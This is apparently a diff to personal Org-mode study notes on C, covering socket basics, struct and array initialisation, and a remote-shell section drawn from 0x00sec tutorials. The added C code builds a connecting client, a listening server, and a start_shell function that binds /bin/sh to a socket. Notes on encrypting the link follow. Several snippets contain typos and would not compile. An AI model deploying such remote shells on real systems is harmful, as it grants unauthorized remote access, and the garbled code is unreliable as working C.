@@ -34,8 +34,23 @@
 - http://blog.lujun9972.win/emacs-document/blog/2018/03/22/emacs-as-a-c++-ide/index.html
   https://vxlabs.com/2016/04/11/step-by-step-guide-to-c-navigation-and-completion-with-emacs-and-the-clang-based-rtags/
 * Language
+** Sockets
+
+- CLIENT
+  s = socket()
+  opts = htons+inet_addr
+  connect(s, opts)
+
+- SERVER
+  s = socket()
+  opts = htons+htonl
+  bind(s, opts)
+  listen(s, BACKLOG)
+  accept(s) // wait
+
 ** Types
-- struct intialization
+
+- =struct= intialization
   #+begin_src c
     typedef struct {
       unsigned char c1;
@@ -44,7 +59,8 @@
 
     myStruct _m1 = {0};
   #+end_src
-- arrays initialization
+
+- =arrays= initialization
   - globals and static are _automatically_ initialized to zero
   - arrays as local, either
     #+begin_src c
@@ -60,10 +76,8 @@
       } user_struct;
       user_struct arr[5] = {0};
     #+end_src
-  - arrays in structs can be initialized
-    #+begin_src c
-      
-    #+end_src
+  - arrays in structs can be initialized... TODO?
+
 ** Standard Library
 - https://en.cppreference.com/w/c/header
 - https://en.wikibooks.org/wiki/C_Programming/stdbool.h
@@ -130,18 +144,105 @@
 **   I Use Cases
 https://0x00sec.org/t/remote-shells-part-i/269/1
 
-- in the cases when is not possible to even deploy a service like "ssh" or "telnet"
-  you can easily write your own remote shell program
+- Remote Access:
+  In the cases when is NOT possible to deploy a service like "ssh" or "telnet"
+  you can easily write your own remote shell program.
+
+- Types of Remote Shells
+  - Direct: act like servers
+  - Reverse: the application "calls back home" to a specifict server/port
+
+*** client
+
+#+begin_src c
+  #include <stdio.h>
+  #include <stdlib.h>
+  #include <unistd.h>
+  #include <sys/socket.h>
+  #include <arpa/inet.h>
+
+  int client_init(char *ip, int port) {
+    int s;
+    if ((s = socket(AF_INET; SOCK_STREAM, 0) < 0) {
+        perror("socket:");
+        exit(EXIT_FAILURE);
+    }
+
+    struct sockaddr_in serv;
+    serv.sin_family = AF_INET;
+    serv.sin_port = htons(port);
+    serv.sin_addr.s_s_addr = inet_addr(ip);
+    if (connect(s, (struct sockaddr *)&serv, sizeof(serv)) < 0) {
+      perror("connect:");
+      exit(EXIT_FAILURE);
+    }
+
+    return s;
+  }
+#+end_src
+
+*** server
+
+#+begin_src c
+  inet server_init(int port) {
+    int s;
+    if ((s = socket(AF_INET, SOCK_STREAM, 0) < 0)) {
+      perror("socket:");
+      exit(EXIT_FAILURE);
+    }
+
+    struct sockaddr_in serv;
+    serv.sin_family = AF_INET;
+    serv.sin_port = htons(port);
+    serv.sin_addr.s_addr = htonl(INADDR_ANY);
+    if ((bind(s, (struct sockaddr *)&serv, sizeof(struct sockaddr_in))) < 0) {
+      perror("bind:");
+      exit(EXIT_FAILURE);
+    }
+    if ((listen(s, 10)) < 0) {
+      perror("listen:");
+      exit(EXIT_FAILURE);
+    }
+
+    socklen_t clen = sizeof(struct sockaddr_in);
+    struct sockaddr_in client;
+    int s1;
+    if ((s1 = accept(s, (struct sockaddr *) &client, &clen)) < 0) {
+      perror("accept:");
+      exit(EXIT_FAILURE);
+    }
+    return s1;
+  }
+#+end_src
+
+*** start_shell
+
+#+begin_src c
+  int start_shell(int s) {
+    dup2(s, 0);
+    dup2(s, 1);
+    dup2(s, 2);
+    char *name[3];
+    name[0] = "/bin/sh";
+    name[1] = "-i";
+    name[2] = NULL;
+    execve(name[0], name);
+    exit(1);
+    return 0;
+  }
+#+end_src
 
 **  II Crypt your link
 - https://0x00sec.org/t/remote-shells-part-ii-crypt-your-link/306
 - https://en.wikipedia.org/wiki/Loop_unrolling
+
 - SocketPair
   - Used to transfer data
   - Are a pair of sockets that are immediatly connected
     Something like runing a client and a server in 1 call
   - Kind of like a bidirectional PIPE
   - Convenient IPC
+
 - secure_shell()
   | Parent       | Child              |
   |--------------+--------------------|
@@ -149,11 +250,13 @@ https://0x00sec.org/t/remote-shells-part-i/269/1
   | fork()       | fork()             |
   | close(sp[0]) | close(sp[1])       |
   | async_read() | start_shell(sp[0]) |
+
 - async_read()
   select()
   memset()
   read()
   memfrob()
+
 - We use stdin socket as the input socket for async_read() on main()
 
 ** III Shell Access your Phone
